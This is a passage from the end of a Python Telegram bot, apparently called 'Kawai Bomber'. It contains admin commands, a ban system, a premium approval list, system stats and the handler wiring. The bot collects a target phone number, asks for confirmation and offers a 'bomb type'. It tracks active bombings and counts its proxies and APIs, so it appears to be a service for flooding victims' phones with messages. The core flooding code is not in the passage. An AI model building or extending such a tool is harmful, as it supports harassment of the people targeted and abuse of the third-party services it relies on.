        if admin_id != 8291098446:  # Can't remove main admin
            ADMIN_IDS.remove(admin_id)
            await update.message.reply_text(
                f"{EMOJIS['success']} Removed admin {admin_id}!"
            )
        else:
            await update.message.reply_text(f"{EMOJIS['error']} Cannot remove main admin!")
    except:
        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    
    try:
        approve_id = int(context.args[0])
        APPROVED_USERS.add(approve_id)
        await update.message.reply_text(
            f"{EMOJIS['success']} Approved user {approve_id}!"
        )
    except:
        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")

async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user approval"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /removeuser <user_id>")
        return
    
    try:
        user_id_to_remove = int(context.args[0])
        if user_id_to_remove in APPROVED_USERS:
            APPROVED_USERS.remove(user_id_to_remove)
            await update.message.reply_text(
                f"{EMOJIS['success']} Removed approval from user {user_id_to_remove}!"
            )
        else:
            await update.message.reply_text(f"{EMOJIS['warning']} User not approved!")
    except:
        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    
    try:
        ban_id = int(context.args[0])
        BANNED_USERS.add(ban_id)
        
        # Stop active bombing
        if ban_id in active_bombs:
            del active_bombs[ban_id]
        
        await update.message.reply_text(
            f"{EMOJIS['ban']} Banned user {ban_id}!"
        )
    except:
        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    
    try:
        unban_id = int(context.args[0])
        if unban_id in BANNED_USERS:
            BANNED_USERS.remove(unban_id)
            await update.message.reply_text(
                f"{EMOJIS['unban']} Unbanned user {unban_id}!"
            )
        else:
            await update.message.reply_text(f"{EMOJIS['warning']} User not banned!")
    except:
        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    message = " ".join(context.args)
    
    # In production, broadcast to all users
    await update.message.reply_text(
        f"{EMOJIS['broadcast']} <b>Broadcast prepared!</b>\n\n"
        f"Message: {message}\n\n"
        f"Would be sent to {len(USER_DB)} users.",
        parse_mode=ParseMode.HTML
    )

async def sysinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """System info"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    import platform
    import psutil
    
    cpu = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    
    sysinfo_text = f"""
{EMOJIS['server']} <b>SYSTEM INFORMATION</b> {EMOJIS['server']}

{EMOJIS['cpu']} <b>CPU Usage:</b> {cpu}%
{EMOJIS['memory']} <b>Memory:</b> {memory.percent}%
{EMOJIS['os']} <b>OS:</b> {platform.system()}
{EMOJIS['python']} <b>Python:</b> {platform.python_version()}

{EMOJIS['bot']} <b>Bot Info:</b>
├─ {EMOJIS['users']} <b>Users:</b> {len(USER_DB)}
├─ {EMOJIS['active']} <b>Active:</b> {len(active_bombs)}
├─ {EMOJIS['proxies']} <b>Proxies:</b> {len(PROXY_LIST)}
└─ {EMOJIS['apis']} <b>APIs:</b> {len(APIS)}
"""
    
    await update.message.reply_text(
        sysinfo_text,
        parse_mode=ParseMode.HTML
    )

# ==================== BUTTON HANDLERS ====================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if data == "start_bomb":
        await bomb_command(update, context)
    elif data == "show_stats":
        await status_command(update, context)
    elif data == "help_menu":
        await help_command(update, context)
    elif data == "admin_panel":
        if user_id in ADMIN_IDS:
            await admin_command(update, context)
        else:
            await query.answer("Access denied!", show_alert=True)
    elif data == "settings":
        # Simple settings response
        await query.edit_message_text(
            f"{EMOJIS['settings']} <b>Settings</b>\n\n"
            f"Premium: {'Yes' if user_id in APPROVED_USERS else 'No'}\n"
            f"Admin: {'Yes' if user_id in ADMIN_IDS else 'No'}\n"
            f"Status: {'Active' if user_id not in BANNED_USERS else 'Banned'}",
            parse_mode=ParseMode.HTML
        )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel conversation"""
    await update.message.reply_text(
        f"{EMOJIS['success']} <b>Operation cancelled!</b>",
        parse_mode=ParseMode.HTML
    )
    return ConversationHandler.END

# ==================== ERROR HANDLER ====================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    try:
        raise context.error
    except InvalidToken:
        print(f"\n{EMOJIS['error']} ERROR: Invalid bot token!")
        print(f"Please check your BOT_TOKEN in Railway variables.")
        print(f"Current token: {BOT_TOKEN[:10]}...")
    except Exception as e:
        print(f"\n{EMOJIS['error']} ERROR: {e}")

# ==================== MAIN FUNCTION ====================
def main():
    """Start the bot"""
    print(BANNER)
    print(f"{EMOJIS['sparkles']} Kawai Bomber")
    print(f"{EMOJIS['heart']} Made by @zerocyph")
    print(f"{EMOJIS['power']} Powered by Python-Telegram-Bot")
    print(f"{EMOJIS['warning']} Starting bot...")
    
    # Create Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("bomb", bomb_command)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
            CONFIRM: [CallbackQueryHandler(handle_confirm, pattern="^confirm_")],
            BOMB_TYPE: [CallbackQueryHandler(handle_bomb_type, pattern="^type_")]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    )
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Admin commands
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("removeadmin", removeadmin_command))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("removeuser", removeuser_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("sysinfo", sysinfo_command))
    
    # Add conversation handler
    application.add_handler(conv_handler)
    
    # Add callback query handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start the bot
    print(f"\n{EMOJIS['rocket']} Bot is running...")
    print(f"{EMOJIS['star']} Press Ctrl+C to stop")
    
    try:
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
    except InvalidToken as e:
        print(f"\n{EMOJIS['error']} FATAL ERROR: Invalid bot token!")
        print(f"Please check your BOT_TOKEN environment variable.")
        print(f"Token used: {BOT_TOKEN[:10]}...")
        sys.exit(1)
    except Exception as e:
        print(f"\n{EMOJIS['error']} FATAL ERROR: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
